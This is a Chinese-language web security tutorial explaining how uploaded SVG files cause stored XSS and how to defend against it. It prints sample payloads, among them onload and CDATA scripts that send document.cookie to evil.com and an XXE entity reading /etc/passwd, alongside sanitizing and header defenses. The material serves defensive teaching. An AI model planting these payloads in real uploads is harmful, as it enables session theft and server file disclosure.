---
title: "SVG文件上传为什么会引发XSS攻击？"
slug: "web-svg-xss-d4174758"
summary: "很多人以为SVG只是图片，上传没什么风险。但SVG本质是XML，可以内嵌JavaScript，一旦被浏览器直接渲染就会触发脚本执行。本文从原理到攻击示例再到防御方案，完整讲清楚这个容易被忽视的安全漏洞。"
category: "Web安全"
tags:
  - "XSS"
  - "SVG"
  - "文件上传安全"
  - "Web安全"
  - "前端安全"
status: "draft"
sortOrder: 20
cover: ""
originalId: "6a2d291f8a2b1c68f2cac2ee"
originalSlug: "web-svg-xss-d4174758"
originalStatus: "published"
exportedAt: "2026-07-30T14:46:52.260Z"
---
# SVG文件上传为什么会引发XSS攻击？

## 先说结论

SVG 不是普通图片，它是 **XML 格式的文本文件**，可以合法地内嵌 JavaScript 代码。当浏览器直接渲染一个 SVG 文件时，里面的脚本会被执行。如果你的网站允许用户上传 SVG 并直接对外提供访问，攻击者就能借此发动 XSS 攻击。

这不是理论漏洞，GitHub、Umbraco、Plane、Traccar 等知名项目都曾因此收到安全报告。

---

## 一、SVG 到底是什么？

大多数人对图片格式的认知是：PNG、JPG、GIF 是二进制图像数据，浏览器只负责"画"出来，不会执行里面的内容。

SVG（Scalable Vector Graphics）完全不同。它的本质是 **XML 文档**，用标签描述图形：

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
```

这段代码画了一个红色圆形。看起来人畜无害。

但 XML/SVG 规范允许在文档里嵌入 `<script>` 标签，也允许在元素上绑定事件处理器（`onload`、`onclick` 等）。这就是问题的根源。

---

## 二、攻击原理：SVG 里藏脚本

### 方式一：直接嵌入 `<script>` 标签

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert(document.cookie)
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

把这个文件命名为 `avatar.svg`，上传到某个允许 SVG 的头像上传接口。如果服务器把它原样存储并通过 `image/svg+xml` 的 Content-Type 返回，浏览器打开这个 URL 时，`alert(document.cookie)` 就会执行。

### 方式二：事件处理器触发

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/steal?c='+document.cookie)">
  <rect width="200" height="200" fill="green"/>
</svg>
```

`onload` 事件在 SVG 加载完成后自动触发，不需要用户点击任何东西。

### 方式三：`<use>` 标签引用外部资源

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="https://evil.com/malicious.svg#payload"/>
</svg>
```

通过 `<use>` 引用外部 SVG 片段，可以加载攻击者控制的内容。

### 方式四：CDATA 绕过过滤

一些简单的过滤器只检查 `<script>` 字符串，攻击者可以用 CDATA 包裹绕过：

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    document.location='https://evil.com/?c='+document.cookie
  ]]></script>
</svg>
```

---

## 三、为什么 `<img>` 标签相对安全，直接访问 URL 就危险？

这是一个关键区分点，很多人会问：我用 `<img src="avatar.svg">` 显示图片，不也没事吗？

确实，当 SVG 通过 `<img>` 标签加载时，浏览器会对其进行**沙箱化处理**，不执行内部脚本。但有以下几种情况仍然危险：

| 场景 | 是否执行脚本 |
|------|------------|
| `<img src="file.svg">` | ❌ 不执行（沙箱） |
| `<object data="file.svg">` | ✅ 执行 |
| `<embed src="file.svg">` | ✅ 执行 |
| 直接在浏览器地址栏打开 SVG URL | ✅ 执行 |
| SVG 内联到 HTML（`<svg>...</svg>`） | ✅ 执行 |
| `<iframe src="file.svg">` | ✅ 执行 |

所以即使你的页面用 `<img>` 显示，只要用户能直接访问那个 SVG 的 URL（比如右键"在新标签页打开图片"），脚本就会执行。

更危险的是：脚本在**你的域名下**执行，意味着它能访问你域名下的 Cookie、LocalStorage、发起同域请求，完全绕过同源策略。

---

## 四、这是 Stored XSS（存储型 XSS）

这类攻击属于**存储型 XSS**，危害比反射型更大：

1. 攻击者上传恶意 SVG 文件
2. 服务器存储该文件
3. 其他用户访问包含该 SVG 的页面或直接打开 URL
4. 脚本在受害者浏览器中执行，窃取 Cookie / Session Token / 执行任意操作

攻击者不需要诱导受害者点击特殊链接，只要受害者正常浏览网站就中招。

---

## 五、真实案例

- **Plane（项目管理工具）**：允许上传 SVG 作为头像，未做净化处理，导致存储型 XSS。CVE 已公开，2024年1月修复。
- **Umbraco CMS**：后台用户可上传含脚本的 SVG，诱导其他管理员打开后执行。影响版本 7.x ~ 12.x，2023年12月修复。
- **Traccar（GPS追踪系统）**：SVG 上传接口未净化，2024年修复。
- **Halo 博客系统**：社区 Issue #1575 报告了同类问题。

这些都是正规开源项目，说明这个漏洞非常容易被忽视。

---

## 六、防御方案

### 方案一：直接禁止上传 SVG（最简单）

如果业务不需要 SVG，直接在文件类型白名单里排除掉。只允许 `image/png`、`image/jpeg`、`image/gif`、`image/webp` 等光栅图片格式。

```js
// 前端校验（仅作提示，不能作为唯一防线）
const ALLOWED_TYPES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp']

function validateFile(file) {
  if (!ALLOWED_TYPES.includes(file.type)) {
    throw new Error('不支持该文件格式')
  }
}
```

**注意**：前端校验可以被绕过，后端必须同样校验。

### 方案二：服务端净化 SVG 内容

如果业务确实需要 SVG，必须在服务端对上传的 SVG 进行净化，移除所有脚本相关内容。

**Node.js 方案（DOMPurify + jsdom）：**

```js
import { JSDOM } from 'jsdom'
import DOMPurify from 'dompurify'

function sanitizeSvg(svgContent) {
  const window = new JSDOM('').window
  const purify = DOMPurify(window)

  // 净化 SVG，移除 script 标签和事件处理器
  const clean = purify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
    FORBID_TAGS: ['script', 'use'],
    FORBID_ATTR: ['onload', 'onclick', 'onerror', 'onmouseover', 'href']
  })

  return clean
}
```

**PHP 方案（svg-sanitizer）：**

```php
use enshrined\svgSanitize\Sanitizer;

$sanitizer = new Sanitizer();
$cleanSvg = $sanitizer->sanitize($dirtysvg);
```

### 方案三：设置正确的 Content-Type 和响应头

即使 SVG 内容没有被净化，通过响应头也能降低风险：

```
# 强制浏览器下载而不是渲染
Content-Disposition: attachment; filename="file.svg"

# 或者用纯文本类型，阻止脚本执行
Content-Type: text/plain

# 开启 CSP，禁止内联脚本
Content-Security-Policy: default-src 'self'; script-src 'none'

# 防止 MIME 类型嗅探
X-Content-Type-Options: nosniff
```

### 方案四：转换为光栅图片

上传后将 SVG 转换为 PNG，彻底消除风险：

```js
// 使用 sharp 库将 SVG 转为 PNG
import sharp from 'sharp'

async function convertSvgToPng(svgBuffer) {
  return await sharp(svgBuffer)
    .png()
    .toBuffer()
}
```

这是最彻底的方案，但会丢失 SVG 的矢量特性。

### 方案五：隔离域名存储

将用户上传的文件存储在独立的子域名或 CDN 域名下（如 `static.example.com`），与主站域名隔离。即使脚本执行，也无法访问主站的 Cookie 和 LocalStorage。

---

## 七、防御方案对比

| 方案 | 防护强度 | 实现成本 | 适用场景 |
|------|---------|---------|---------|
| 禁止 SVG 上传 | ⭐⭐⭐⭐⭐ | 低 | 不需要 SVG 的场景 |
| 服务端净化 | ⭐⭐⭐⭐ | 中 | 需要保留 SVG 格式 |
| 转换为 PNG | ⭐⭐⭐⭐⭐ | 中 | 只需展示，不需矢量 |
| 隔离域名 | ⭐⭐⭐⭐ | 高 | 大型平台，多租户系统 |
| 仅设置响应头 | ⭐⭐ | 低 | 辅助手段，不能单独依赖 |

---

## 八、顺带一提：SVG 还有 XXE 漏洞

SVG 是 XML，XML 有一个叫 **XXE（XML External Entity）** 的漏洞。攻击者可以在 SVG 里声明外部实体，让服务器去读取本地文件或发起内网请求：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

如果服务端解析这个 SVG 时没有禁用外部实体，`/etc/passwd` 的内容就会被读取出来。这是服务端漏洞，和 XSS 是两个不同的攻击面，但同样危险。

防御方式：解析 XML 时禁用外部实体（DTD）。

---

## 九、总结

| 认知误区 | 正确理解 |
|---------|---------|
| SVG 是图片，和 PNG 一样安全 | SVG 是 XML 文本，可以内嵌脚本 |
| 用 `<img>` 显示就没问题 | 用户直接访问 URL 仍会执行脚本 |
| 只要检查文件扩展名就够了 | 攻击者可以伪造扩展名，必须检查内容 |
| 前端校验了就安全 | 前端校验可被绕过，后端必须二次校验 |

同事说的是对的。SVG 上传确实是一个真实的、被广泛利用的 XSS 攻击向量。最稳妥的做法是：**业务不需要 SVG 就直接禁掉；需要的话，必须在服务端净化内容，同时配合隔离域名和 CSP 响应头做纵深防御。**
